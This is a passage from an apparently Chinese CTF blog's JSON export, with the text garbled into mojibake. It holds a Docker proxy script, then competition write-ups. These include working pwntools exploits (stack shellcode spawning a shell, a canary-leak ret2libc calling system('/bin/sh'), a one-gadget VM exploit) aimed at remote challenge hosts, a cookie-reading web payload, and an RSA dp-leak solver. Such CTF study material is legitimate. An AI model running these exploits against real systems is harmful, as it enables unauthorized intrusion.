(é»˜è®¤: $DEFAULT_PROXY)&quot; echo &quot; unset - å–æ¶ˆ Docker ä»£ç†é…ç½®&quot; exit 1&#125;# æ£€æŸ¥æ˜¯å¦ä»¥ root æƒé™è¿è¡Œcheck_root() &#123; if [ &quot;$EUID&quot; -ne 0 ]; then echo &quot;è¯·ä½¿ç”¨ sudo æˆ–ä»¥ root æƒé™è¿è¡Œæ­¤è„šæœ¬&quot; exit 1 fi&#125;# è®¾ç½® Docker ä»£ç†set_proxy() &#123; local proxy_addr=$&#123;1:-$DEFAULT_PROXY&#125; echo &quot;æ­£åœ¨è®¾ç½® Docker ä»£ç†: $proxy_addr&quot; # åˆ›å»ºé…ç½®ç›®å½• mkdir -p &quot;$PROXY_DIR&quot; # åˆ›å»ºä»£ç†é…ç½®æ–‡ä»¶ cat &gt; &quot;$PROXY_CONF&quot; &lt;&lt; EOF[Service]Environment=&quot;HTTP_PROXY=http://$proxy_addr&quot;Environment=&quot;HTTPS_PROXY=http://$proxy_addr&quot;Environment=&quot;NO_PROXY=localhost,127.0.0.1,.docker.internal,.hubproxy.docker.internal&quot;EOF # é‡æ–°åŠ è½½é…ç½®å¹¶é‡å¯ Docker systemctl daemon-reload systemctl restart docker echo &quot;Docker ä»£ç†è®¾ç½®å®Œæˆ&quot; echo &quot;å½“å‰ä»£ç†é…ç½®:&quot; systemctl show --property=Environment docker&#125;# å–æ¶ˆ Docker ä»£ç†é…ç½®unset_proxy() &#123; echo &quot;æ­£åœ¨å–æ¶ˆ Docker ä»£ç†é…ç½®&quot; # åˆ é™¤ä»£ç†é…ç½®æ–‡ä»¶ if [ -f &quot;$PROXY_CONF&quot; ]; then rm -f &quot;$PROXY_CONF&quot; echo &quot;å·²åˆ é™¤ä»£ç†é…ç½®æ–‡ä»¶: $PROXY_CONF&quot; else echo &quot;æœªæ‰¾åˆ°ä»£ç†é…ç½®æ–‡ä»¶: $PROXY_CONF&quot; fi # é‡æ–°åŠ è½½é…ç½®å¹¶é‡å¯ Docker systemctl daemon-reload systemctl restart docker echo &quot;Docker ä»£ç†é…ç½®å·²å–æ¶ˆ&quot; echo &quot;å½“å‰ç¯å¢ƒå˜é‡:&quot; systemctl show --property=Environment docker&#125;# ä¸»ç¨‹åºmain() &#123; check_root case &quot;$1&quot; in set) set_proxy &quot;$2&quot; ;; unset) unset_proxy ;; *) usage ;; esac&#125;# æ‰§è¡Œä¸»ç¨‹åºmain &quot;$@&quot; ç„¶åèµ‹æ‰§è¡Œæƒé™ 1sudo chmod +x /usr/bin/dockerproxy ç½‘å¡ï¼ˆæ¨¡ç³ŠåŒ–å¤„ç†ï¼‰â†’ å®¿ä¸»æœºçš„ IPï¼ˆåœ¨è™šæ‹Ÿç½‘ç»œç¯å¢ƒä¸‹ VM&#x2F;å®¹å™¨å¯è¾¾çš„åœ°å€ï¼‰ 7890 â†’ ä»£ç†è½¯ä»¶æä¾›çš„æœåŠ¡ç«¯å£ï¼ˆé€šå¸¸æ˜¯ HTTP&#x2F;HTTPS ä»£ç†ï¼Œå¸¸è§äº Clashï¼‰ ä½œç”¨ï¼šè®© Docker çš„ç½‘ç»œè¯·æ±‚èµ°ä»£ç†ï¼ŒåŠ é€Ÿ&#x2F;ç»•è¿‡ç½‘ç»œé™åˆ¶ã€‚ 1DEFAULT_PROXY=&quot;ç½‘å¡:7890&quot; åœ¨å®¿ä¸»æœºï¼ˆWindowsï¼‰ä¸Šè·‘ Clashï¼Œå¼€äº†ä¸€ä¸ªä»£ç†ï¼š ä½†æ˜¯åœ¨ Kali è™šæ‹Ÿæœºé‡Œè·‘ Dockerï¼Œè¦è®© Docker ç”¨è¿™ä¸ªä»£ç†ï¼š åœ¨ VM é‡Œå†™ 127.0.0.1:7890 æ˜¯ä¸å¯¹çš„ï¼Œå› ä¸ºé‚£æ˜¯ VM è‡ªå·±ã€‚ è¦å†™å®¿ä¸»æœºåœ¨ VM çœ¼ä¸­çš„åœ°å€ï¼Œæ¯”å¦‚ ç½‘å¡:7890ã€‚è¿™æ · Docker è¯·æ±‚æ‰ä¼šæ­£ç¡®å‘åˆ°å®¿ä¸»æœºçš„ä»£ç†ã€‚ ä½¿ç”¨ 12sudo dockerproxy set#ä½¿ç”¨ä»£ç†sudo dockerproxy unset#å–æ¶ˆä»£ç† ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ä»£ç† 1sudo dockerproxy set 172.27.16.1:7890 éªŒè¯æ˜¯å¦èµ°ä»£ç† 1docker info | grep -i proxy HTTP Proxy &#x2F; HTTPS Proxy â†’ Docker Daemon çš„å…¨å±€ç½‘ç»œè¯·æ±‚ä¼šèµ° Windows å®¿ä¸»æœºä¸Šçš„ Clash ä»£ç† No Proxy â†’ è¿™äº›åœ°å€ä¸èµ°ä»£ç†ï¼ˆæœ¬æœºå›ç¯å’Œ Docker å†…éƒ¨åŸŸåï¼‰ ï¼ˆwarningæ˜¯å®¿ä¸»æœºå†…æ ¸ç¼ºå°‘ blkioï¼ˆå—è®¾å¤‡é™é€Ÿï¼‰çš„æ”¯æŒï¼Œè·Ÿä»£ç†æ²¡å…³ç³»ï¼Œå¯ä»¥å¿½ç•¥ï¼‰ é•œåƒæ“ä½œ1.å…ˆè¦æ‹‰å–é•œåƒ 1234docker pull ubuntu:22.04docker pull ubuntu:20.04docker pull ubuntu:18.04docker pull ubuntu:16.04 å¾ˆå¤šæ—¶å€™ï¼ŒDockerfile é‡Œå¼€å¤´å†™çš„æ˜¯ï¼š 1FROM ubuntu:22.04 é‚£ä¹ˆåœ¨ docker build æ—¶ï¼Œå¦‚æœæœ¬åœ°æ²¡æœ‰ ubuntu:22.04ï¼ŒDocker å°±ä¼šè‡ªåŠ¨å»æ‹‰ã€‚ è¿™ä¸ªæ“ä½œå…¶å®å°±æ˜¯æå‰æŠŠå®ƒä¿å­˜åœ¨æœ¬åœ°ï¼Œå› ä¸ºå®ƒä¹Ÿéœ€è¦é…ç½®ä»£ç†ï¼Œåˆšå¥½æµ‹è¯•ä½ çš„ ä»£ç†é…ç½®æ˜¯å¦ç”Ÿæ•ˆã€‚ 2.ä»Githubä¸Šä¸‹è½½æ‰“åŒ…å¥½çš„é¡¹ç›® é“¾æ¥(ä¹Ÿéœ€è¦é“¾æ¥ä»£ç†) ç„¶åæŠŠå¯¹åº”ç‰ˆæœ¬çš„é™„ä»¶é‡å‘½åä¹‹åæ›¿æ¢srcä¸­çš„æ–‡ä»¶å°±å¥½äº† 3.æœ€åå°±æ˜¯buildé•œåƒ pushä¸Šå» ä¹‹ååœ¨é•œåƒåº“é‡Œå°±å¯ä»¥æ‰¾åˆ°è¿™ä¸ªé•œåƒäº† æœ€åæŠŠè¿™ä¸ªé•œåƒçš„å®Œæ•´å¼•ç”¨æ”¾å…¥ç½‘ç«™å°±å¯ä»¥äº†","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"ç¬¬ä¸‰å±Šé™‡å‰‘æ¯å†³èµ›","slug":"ç¬¬ä¸‰å±Šé™‡å‰‘æ¯å†³èµ›","date":"2025-09-22T08:17:13.000Z","updated":"2025-09-24T07:58:50.989Z","comments":true,"path":"2025/09/22/ç¬¬ä¸‰å±Šé™‡å‰‘æ¯å†³èµ›/","permalink":"http://example.com/2025/09/22/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%99%87%E5%89%91%E6%9D%AF%E5%86%B3%E8%B5%9B/","excerpt":"","text":"pwn1é™„ä»¶ å¯ä»¥çœ‹åˆ°Stack: Executable/Has RWX segmentså…è®¸åœ¨æ•°æ®ï¼ˆæ ˆæˆ–æŸä¸ªæ®µï¼‰ä¸Šæ‰§è¡Œä»£ç  æŸ¥çœ‹æ‰§è¡Œæƒé™ vmmapï¼š0x7ffffffdd000 - 0x7ffffffff000 rwxp [stack] ä»»ä½• 0x7ffffffdd000 &lt;= addr &lt; 0x7ffffffff000 çš„åœ°å€éƒ½å±äºâ€œå¯æ‰§è¡Œæ ˆé¡µâ€ â†’ å¯æ‰§è¡Œã€‚ gdbè°ƒè¯•çœ‹bufçš„èŒƒå›´ å¯ä»¥çœ‹åˆ°destçš„åœ°å€å’Œretçš„åœ°å€ä½ç½®ä¸€æ ·ï¼Œæƒ³åˆ°æŠŠæ”¾ç½®shellcodeçš„ä½ç½®æ”¾è¿‡å»æ‰§è¡Œ ä¸”è¿™ä¸ªä½ç½®éœ€è¦å†åœ¨bufä¹‹å†…ï¼Œæ–¹ä¾¿åç»­å¯¹bufçš„å†™å…¥ åœ¨æ ˆä¸ŠæŸ¥æ‰¾å‘ç°bufçš„-0xf0å¤„çš„åœ°å€ç¬¦åˆè¦æ±‚ è„šæœ¬ 12345678910111213141516171819202122232425262728from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./way&quot;remote_host = &quot;node5.buuoj.cn&quot;remote_port = 123445#libc=ELF(&quot;libc.so.6&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) gdb.attach(p, &quot;b*0x401315&quot;)def sla(a, b): p.sendlineafter(a, b)def sa(a,b): p.sendafter(a,b)p.sendlineafter(&quot;Where is the your home:&quot; , str(-0xf0))shellcode = 0x40 * b&#x27;a&#x27; + asm(shellcraft.sh())print(hex(len(shellcode)))p.sendafter(&quot;Where can you find mother:&quot; , shellcode)p.sendlineafter(&quot;How many moms did you find:&quot; , b&#x27;5&#x27;)p.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"ç½‘è°·æ¯","slug":"ç½‘è°·æ¯","date":"2025-09-14T06:16:09.000Z","updated":"2025-09-14T06:21:21.960Z","comments":true,"path":"2025/09/14/ç½‘è°·æ¯/","permalink":"http://example.com/2025/09/14/%E7%BD%91%E8%B0%B7%E6%9D%AF/","excerpt":"","text":"pwné‡‘ä¸é›€-wgbé™„ä»¶ åˆ†æçœ‹åˆ°mainä¸­çš„bufå¯ä»¥ç»•è¿‡canaryï¼Œè€Œgiftæ˜¯å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡º ç”¨readå‡½æ•°å»æ³„éœ²ï¼ŒæŠŠcanaryçš„å€¼æ”¾åˆ°bssæ®µï¼Œå†™å‡ºæ¥ ä¹‹åç”¨retlibcå»æ³„éœ²å°±å¥½ï¼Œï¼ˆæŠŠcanaryæ”¾åœ¨åˆé€‚çš„ä½ç½®ä¸Šé¢ï¼‰ å¯ä»¥çœ‹åˆ° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *#p= process(&quot;./111&quot;)p=remote(&quot;119.36.240.225&quot;,48793)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&quot;./111&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)pop_rdi = 0x4013e3ret = 0x40101agift = 0x40123Dbss = 0x404f00puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]lea=0x401296payload = p64(bss) + p64(lea)p.sendlineafter(&#x27;Do you want to enter other functions?&#x27;, &#x27;2&#x27;)p.send(payload)lea=0x4012EApayload = p64(bss - 0x8 + 0x50) + p64(lea)p.sendlineafter(&#x27;Do you want to enter other functions?&#x27;, &#x27;2&#x27;)p.send(payload)p.recvline().strip()canary = u64(p.recv(8) , 16)print(&quot;=====&quot; , canary)p.sendlineafter(&#x27;Do you want to enter other functions?&#x27;, &#x27;1&#x27;)payload = b&#x27;a&#x27; * 0x38 + p64(canary) + p64(0)payload+=p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(gift)p.send(payload)libc_base = u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;)) - 0x84420 system_addr = libc_base + libc.symbols[&#x27;system&#x27;]binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))payload = b&#x27;a&#x27; * 0x38 + p64(canary) + p64(0)payload+= p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)p.send(payload)p.interactive() flag{9fa258d4-dfef-414d-80f9-9e315889462f} æ³¨æ„ï¼Œè¿™é‡Œè¦æŠ¬æ ˆï¼Œä¸ç„¶å‡½æ•°ä¼šåœ¨scanfå¡ä½[0x403b08] è¿™é‡Œå¡åœ¨äº†movæ“ä½œï¼Œè¦å†™å…¥çš„wæƒé™ zeroday-wgbé™„ä»¶ åˆ†æï¼Œ6å¯ä»¥è¾“å‡ºåœ°å€ï¼Œç”¨å®ƒæ¥æ³„éœ²libcåŸºåœ°å€ï¼Œ7å¯ä»¥ç›´æ¥è¿è¡Œ+144çš„ä½ç½®ï¼Œä½†æ˜¯bufæœ€å¤šè¾“å…¥0x400,æ‰€ä»¥è¦å¯¹buf_0è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯ç”¨1è¿›è¡Œï¼Œåœ¨+144ä½ç½®ä¸Šæ”¾ä¸Šåé—¨å‡½æ•°å°±å¯ä»¥äº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *import sysp = remote(&quot;119.36.240.225&quot;, 43376)libc = ELF(&quot;libc.so.6&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&quot;./pwn&quot;)def sa(a, b): p.sendafter(a, b)def push_q(x): return b&#x27;\\x01&#x27; + p64(x)def op_pop(): return b&#x27;\\x02&#x27;def op_add(): return b&#x27;\\x03&#x27;def op_xor(): return b&#x27;\\x04&#x27;def op_print():return b&#x27;\\x05&#x27;def op_call(): return b&#x27;\\x06&#x27;def leak(addr):return b&#x27;\\x07&#x27; + p64(addr)puts_got = elf.got[&quot;puts&quot;]payload_leak = leak(puts_got)sa(b&quot;Enter bytecode:&quot;, payload_leak)p.recvuntil(b&quot;LEAK: &quot;)leak_line = p.recvline()parts = leak_line.split(b&#x27; &#x27;)puts_real_addr_str = parts[2]puts_real_addr = int(puts_real_addr_str, 16)log.info(f&quot;Puts real address: &#123;hex(puts_real_addr)&#125;&quot;)libc_base = puts_real_addr - libc.symbols[&quot;puts&quot;]log.info(f&quot;Libc base address: &#123;hex(libc_base)&#125;&quot;)off = 0xe3afetarget = libc_base + offpayload = b&#x27;&#x27;payload += push_q(0) * 16payload += push_q(target)payload += op_call()p.send(payload)sa(b&quot;Enter bytecode:&quot;, b&quot;ls -al&quot;)p.interactive() flag{840fde71-2c8a-4d4f-a716-1232fdf72054} webçœŸå‡ä¹‹é—´-wgb payload:a&#x3D;7e6&amp;b&#x3D;axht&amp;c&#x3D;function%20setItem%28k%2Cv%29%7BsessionStorage.setItem%28k%2CJSON.stringify%28v%29%29%3B%7D%20setItem%28%272025x%27%2C%20%5B%22a%22%2C%209999999999999999%5D%29%3B æ‰§è¡Œ 12345678// è¾“å‡ºå½“å‰é¡µé¢çš„ Cookieconsole.log(&#x27;cookie=&#x27;, document.cookie);// è¾“å‡º sessionStorage ä¸­é”®ä¸º &#x27;2025x&#x27; çš„å€¼console.log(&#x27;sessionStorage[2025x]=&#x27;, sessionStorage.getItem(&#x27;2025x&#x27;));// è¾“å‡º ID ä¸º &#x27;flag_base85&#x27; çš„å…ƒç´ çš„æ–‡æœ¬å†…å®¹ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™è¾“å‡º &#x27;&lt;empty&gt;&#x27;console.log(&#x27;#flag_base85=&#x27;, document.getElementById(&#x27;flag_base85&#x27;) ? document.getElementById(&#x27;flag_base85&#x27;).textContent : &#x27;&lt;empty&gt;&#x27;); flag{D9xT7ePqA1LuVnYk} MISCFormat-8bit-wgbéšæ³¢é€æµæå– è½¬ä¸€ä¸‹ flag{2815dc1e28f9d89e2b80072d23c4dc35} non-interlaced-wgb è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041import numpy as npimport binascii # å¯¼å…¥ binascii åº“ï¼Œç”¨äºå¤„ç†äºŒè¿›åˆ¶å’Œ ASCII ä¹‹é—´çš„è½¬æ¢ï¼ˆå°½ç®¡åœ¨æ­¤è„šæœ¬ä¸­æœªç›´æ¥ä½¿ç”¨ï¼‰import ioimport zipfile # å¯¼å…¥ zipfile åº“ï¼Œç”¨äºå¤„ç† ZIP å‹ç¼©æ–‡ä»¶import os # å¯¼å…¥ os åº“ï¼Œç”¨äºä¸æ“ä½œç³»ç»Ÿäº¤äº’ï¼ˆä¾‹å¦‚æ–‡ä»¶è·¯å¾„ï¼‰from PIL import Image # å¯¼å…¥ Pillow åº“çš„ Image æ¨¡å—ï¼Œç”¨äºå¤„ç†å›¾åƒ# å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†å›¾åƒçš„ RGB é€šé“æ•°æ®æŒ‰é¡ºåºæå–ä¸ºå­—èŠ‚ä¸²def img_to_bytes_rgb_order(path): # ä½¿ç”¨ Pillow åº“æ‰“å¼€å›¾åƒæ–‡ä»¶ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸º RGB æ¨¡å¼ arr = np.array(Image.open(path).convert(&quot;RGB&quot;)) # å°†å›¾åƒçš„ RGB å¹³é¢æŒ‰é¡ºåºæ‹¼æ¥ï¼šé¦–å…ˆæ˜¯æ‰€æœ‰ R é€šé“æ•°æ®ï¼Œç„¶åæ˜¯æ‰€æœ‰ G é€šé“æ•°æ®ï¼Œæœ€åæ˜¯æ‰€æœ‰ B é€šé“æ•°æ® # .flatten() å°†äºŒç»´æ•°ç»„å±•å¹³ä¸ºä¸€ç»´ # .tolist() å°† NumPy æ•°ç»„è½¬æ¢ä¸º Python åˆ—è¡¨ # bytes(...) å°†åˆ—è¡¨è½¬æ¢ä¸ºå­—èŠ‚ä¸² return bytes(arr[:,:,0].flatten().tolist() + arr[:,:,1].flatten().tolist() + arr[:,:,2].flatten().tolist())# é€šè¿‡åˆ—è¡¨æ¨å¯¼å¼ï¼Œä¾æ¬¡å¤„ç†ä¸‰å¼ å›¾åƒï¼Œå¹¶å°†å®ƒä»¬çš„å­—èŠ‚ä¸²è¿æ¥èµ·æ¥# å‡è®¾è¿™ä¸‰å¼ å›¾åƒçš„æ–‡ä»¶è·¯å¾„æ˜¯ &quot;/mnt/data/c1.png&quot;, &quot;/mnt/data/c2.png&quot;, &quot;/mnt/data/c3.png&quot;# æœ€ç»ˆå°†æ‰€æœ‰å›¾åƒçš„å­—èŠ‚æ•°æ®æ‹¼æ¥æˆä¸€ä¸ªå®Œæ•´çš„å­—èŠ‚ä¸²data = b&#x27;&#x27;.join(img_to_bytes_rgb_order(p) for p in [&quot;/mnt/data/c1.png&quot;,&quot;/mnt/data/c2.png&quot;,&quot;/mnt/data/c3.png&quot;])# æŒ‡å®šæ¢å¤åçš„ ZIP æ–‡ä»¶çš„è·¯å¾„zip_path = &quot;/mnt/data/recovered_from_9_images.zip&quot;# ä»¥äºŒè¿›åˆ¶å†™å…¥æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œå°†æ‹¼æ¥å¥½çš„å­—èŠ‚æ•°æ®å†™å…¥å…¶ä¸­with open(zip_path, &quot;wb&quot;) as f: f.write(data)# å°è¯•è¯»å–æ–°åˆ›å»ºçš„ ZIP æ–‡ä»¶ï¼Œå¹¶åˆ—å‡ºå…¶å†…éƒ¨çš„æ–‡ä»¶ålisting = []try: with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zf: # zf.namelist() è·å– ZIP æ–‡ä»¶ä¸­æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„åç§°åˆ—è¡¨ listing = zf.namelist()except Exception as e: # å¦‚æœåœ¨è¯»å– ZIP æ–‡ä»¶æ—¶å‘ç”Ÿä»»ä½•é”™è¯¯ï¼ˆä¾‹å¦‚æ–‡ä»¶æŸåï¼‰ï¼Œåˆ™æ•è·å¼‚å¸¸å¹¶è®°å½•é”™è¯¯ä¿¡æ¯ listing = [f&quot;è¯»å–ZIPæ—¶å‡ºç°é—®é¢˜: &#123;e!r&#125;&quot;]# æ‰“å°æœ€ç»ˆçš„æ–‡ä»¶åˆ—è¡¨æˆ–é”™è¯¯ä¿¡æ¯ï¼Œä»¥ä¾¿ç”¨æˆ·æŸ¥çœ‹ç»“æœprint(listing) flag{1c2121cab407dd44a5540d530ab9c6aa} CRYè¯ä¹¦ä¿®å¤-wgbä¸‰ä¸ªä¸ RSAï¼Œflag1ç›´æ¥è§£ flag23æ˜¯dpæ³„éœ²ï¼Œæ³„éœ²å‚æ•° dpã€å…¬é’¥æŒ‡æ•° e å’Œæ¨¡æ•° nï¼Œè®¡ç®—å‡ºæ¨¡æ•° n çš„ä¸€ä¸ªç´ å› æ•° på»é‡æ„ç§é’¥ dï¼Œä»è€Œè§£å¯†å¯†æ–‡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185#!/usr/bin/env python3# -*- coding: utf-8 -*-from Crypto.Util.number import bytes_to_long, long_to_bytes # å¯¼å…¥ç”¨äºå¤„ç†å¤§æ•´æ•°å’Œå­—èŠ‚ä¸²çš„åº“import math # å¯¼å…¥æ•°å­¦åº“ï¼Œç”¨äºæœ€å¤§å…¬çº¦æ•°è®¡ç®—# è¿™æ®µè„šæœ¬æ—¨åœ¨è§£å†³ä¸‰ä¸ªåŸºäº RSA çš„å¯†ç å­¦æŒ‘æˆ˜ï¼ˆCTF é¢˜ç›®ï¼‰# --- Flag1: é¢˜é¢å·²ç»™ d1, n1ï¼Œç›´æ¥è§£å¯† ---# d1 æ˜¯ç¬¬ä¸€ä¸ªæŒ‘æˆ˜çš„ç§é’¥æŒ‡æ•°d1 = int( &quot;246014400079542834092587904158893656266047385977563055118072356568676746697095&quot; &quot;825913864806962708152448954200878667383422993297898494259484707349502246104506&quot; &quot;292708966897357241647506535040670750128510698600522884133934921403976388746897&quot; &quot;47304249627737638521072321625292497180208183282090634794285367566044496049&quot;)# n1 æ˜¯ç¬¬ä¸€ä¸ªæŒ‘æˆ˜çš„æ¨¡æ•°n1 = int( &quot;121216793759965406495195349784688471172903898464863919579528667261419201175006&quot; &quot;158506254851920269184174476441342645096664857617956346276850231302641370595849&quot; &quot;992364168925183323567715165305825214477546120105756089950903529561478112787635&quot; &quot;175307546002017263761103481685637785188859785795387227441771118141108993731&quot;)# --- Flag2: dp æ³„éœ²æ”»å‡» ---# n2 æ˜¯ç¬¬äºŒä¸ªæŒ‘æˆ˜çš„æ¨¡æ•°n2 = int( &quot;880240914857229681312031297728305248816545296251441345888143405900115541246043&quot; &quot;164032587947185950587601925814651819329544052882761982559510378904410578348151&quot; &quot;153512391510277303040801105941161928077798175274696915482616445385505290118824&quot; &quot;99685981945213841298369305720161373509056672240371216670722254664850792423&quot;)# dp2_hex æ˜¯ç§é’¥æŒ‡æ•° d æ¨¡ p-1 çš„ç»“æœï¼Œä»¥åå…­è¿›åˆ¶ç»™å‡ºdp2_hex = ( &quot;008a1bb5ddfff1643cb542d174a0f4e0616503e28778bd2ecd965026baba357303627d6044b77&quot; &quot;34cef07b8a1176d886ca987cd21ca091755eef7f20634a921ce81&quot;)e2 = 65537 # å…¬é’¥æŒ‡æ•°# --- Flag3: dp æ³„éœ²æ”»å‡» ---# n3 æ˜¯ç¬¬ä¸‰ä¸ªæŒ‘æˆ˜çš„æ¨¡æ•°n3 = int( &quot;161097000312435047639025857083798608426453770394810689419872061300529854423940&quot; &quot;452844900091705515387130272189159935215821125906831946941166430461267964034092&quot; &quot;194438035823677086083564924149614045494613496178826123777949284989729443312266&quot; &quot;399276493423985154752448654420778684877265358368899693320567387749119123981&quot;)# dp3_hex æ˜¯ç§é’¥æŒ‡æ•° d æ¨¡ p-1 çš„ç»“æœï¼Œä»¥åå…­è¿›åˆ¶ç»™å‡ºdp3_hex = ( &quot;0087462d8061c0f6251ca4e9b9dd7d5926d96081d5b52f7b76581365865278f0a13f7051d2ece1&quot; &quot;dda234c41946211a4839f72b2b5fb82bbfa286d82e868ce87341&quot;)e3 = 65537 # å…¬é’¥æŒ‡æ•°def read_cipher(path: str) -&gt; int: &quot;&quot;&quot;ä»æ–‡ä»¶ä¸­è¯»å–å¯†æ–‡ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºå¤§æ•´æ•°ã€‚&quot;&quot;&quot; with open(path, &quot;rb&quot;) as f: return bytes_to_long(f.read())def rsa_decrypt_with_d(n: int, d: int, c: int) -&gt; bytes: &quot;&quot;&quot;ä½¿ç”¨å®Œæ•´çš„ç§é’¥æŒ‡æ•° d å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†ã€‚ å‚æ•°: n (int): RSA æ¨¡æ•°ã€‚ d (int): ç§é’¥æŒ‡æ•°ã€‚ c (int): å¯†æ–‡å¤§æ•´æ•°ã€‚ è¿”å›: bytes: è§£å¯†åçš„æ˜æ–‡å­—èŠ‚ä¸²ã€‚ &quot;&quot;&quot; m = pow(c, d, n) # RSA è§£å¯†çš„æ ¸å¿ƒæ“ä½œ: m = c^d mod n pt = long_to_bytes(m) # å°†å¤§æ•´æ•°æ˜æ–‡è½¬æ¢å›å­—èŠ‚ä¸² return ptdef recover_p_from_dp(n: int, e: int, dp: int) -&gt; int | None: &quot;&quot;&quot; æ ¹æ® d_pï¼ˆdpï¼‰å’Œ nã€eï¼Œåˆ©ç”¨ Fermat å°å®šç†æˆ– k æšä¸¾æ¥æ¢å¤ç´ æ•° pã€‚ åŸç†æ˜¯ dp = d mod (p-1) = e^-1 mod (p-1)ã€‚ è¿™æ¨å¯¼å‡º e*dp â‰¡ 1 (mod p-1)ï¼Œæ‰€ä»¥ e*dp - 1 æ˜¯ p-1 çš„å€æ•°ã€‚ å³ e*dp - 1 = k*(p-1)ï¼Œå¯ä»¥é‡æ–°æ’åˆ—å¾—åˆ° p = (e*dp-1)/k + 1ã€‚ ä¸ºäº†æ‰¾åˆ° kï¼Œæˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªå·²çŸ¥çš„å¼•ç†ï¼š (e*dp - 1) = k*(p-1) ä¸” a^(e*dp-1) â‰¡ a^k(p-1) â‰¡ a (mod p) æ‰€ä»¥ gcd(a^(e*dp-1) - a, n) ä¼šå¾—åˆ° p æˆ– q çš„å› å­ã€‚ å‚æ•°: n (int): RSA æ¨¡æ•°ã€‚ e (int): å…¬é’¥æŒ‡æ•°ã€‚ dp (int): æ³„éœ²çš„ç§é’¥æŒ‡æ•° dpã€‚ è¿”å›: int | None: å¦‚æœæˆåŠŸæ‰¾åˆ° pï¼Œè¿”å› pï¼›å¦åˆ™è¿”å› Noneã€‚ &quot;&quot;&quot; # ä¼˜å…ˆä½¿ç”¨æ›´ç¨³å¦¥çš„ GCD æ–¹æ³•æ¥åˆ†è§£ n edp = e * dp - 1 for a in (2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31): g = math.gcd(pow(a, edp, n) - 1, n) if 1 &lt; g &lt; n: return g # å¦‚æœ GCD æ–¹æ³•å¤±è´¥ï¼Œå›é€€åˆ° k æšä¸¾æ³• num = edp # edp - 1 for k in range(1, e): if num % k == 0: p = num // k + 1 if p &gt; 1 and n % p == 0: return p return Nonedef rsa_decrypt_with_dp(n: int, e: int, dp_hex: str, c: int) -&gt; bytes: &quot;&quot;&quot; ä½¿ç”¨æ³„éœ²çš„ dp æ¥è§£å¯† RSA å¯†æ–‡ã€‚ è¯¥å‡½æ•°é¦–å…ˆåˆ©ç”¨ dp æ¢å¤å‡º pï¼Œç„¶åè®¡ç®— qã€phiã€dï¼Œæœ€åå®Œæˆè§£å¯†ã€‚ å‚æ•°: n (int): æ¨¡æ•°ã€‚ e (int): å…¬é’¥æŒ‡æ•°ã€‚ dp_hex (str): æ³„éœ²çš„ dpï¼Œåå…­è¿›åˆ¶æ ¼å¼ã€‚ c (int): å¯†æ–‡ã€‚ è¿”å›: bytes: è§£å¯†åçš„æ˜æ–‡ã€‚ &quot;&quot;&quot; # å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸² dp_hex è½¬æ¢ä¸ºå¤§æ•´æ•° dp dp = int(dp_hex, 16) # æ¢å¤ç´ æ•° p p = recover_p_from_dp(n, e, dp) if not p: raise ValueError(&quot;æœªèƒ½ä» dp æ¢å¤å‡º pã€‚&quot;) # æ ¹æ® p å’Œ n è®¡ç®— qï¼Œå¹¶è®¡ç®— phi(n) q = n // p phi = (p - 1) * (q - 1) # è®¡ç®—å®Œæ•´çš„ç§é’¥æŒ‡æ•° d = e^-1 mod phi d = pow(e, -1, phi) # ä½¿ç”¨ d å¯¹å¯†æ–‡è¿›è¡Œè§£å¯† m = pow(c, d, n) # å°†è§£å¯†ç»“æœè½¬æ¢å›å­—èŠ‚ä¸² return long_to_bytes(m)def try_print(tag: str, data: bytes): &quot;&quot;&quot; å°è¯•ä»¥ UTF-8 ç¼–ç æ‰“å°æ•°æ®ï¼Œå¦‚æœå¤±è´¥åˆ™ä»¥åå…­è¿›åˆ¶å½¢å¼æ‰“å°ã€‚ å‚æ•°: tag (str): æ‰“å°æ—¶ä½¿ç”¨çš„å‰ç¼€æ ‡ç­¾ã€‚ data (bytes): å¾…æ‰“å°çš„å­—èŠ‚ä¸²æ•°æ®ã€‚ &quot;&quot;&quot; try: # å°è¯•è§£ç ä¸º UTF-8ï¼Œå¿½ç•¥æ— 